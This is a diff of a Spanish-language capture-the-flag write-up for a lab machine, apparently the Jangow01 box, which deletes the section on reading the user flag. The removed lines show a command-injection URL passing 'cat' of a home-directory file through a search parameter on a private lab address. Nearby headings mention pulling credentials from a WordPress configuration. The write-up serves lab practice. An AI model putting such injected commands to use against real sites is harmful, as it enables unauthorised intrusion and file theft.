@@ -116,16 +116,6 @@ El listado reveló, entre otros archivos, `user.txt` y confirmó la existencia d
 
 &nbsp;
 
-### 2.3. Lectura de la bandera de usuario
-
-Se leyó el contenido del fichero localizado en el paso anterior:
-
-```
-http://10.0.2.5/site/busque.php?buscar=cat+/home/jangow01/user.txt
-```
-
-![Bandera de usuario](./img/06-flag-usuario.png)
-
 &nbsp;
 
 ### 2.4. Extracción de credenciales desde la configuración de WordPress
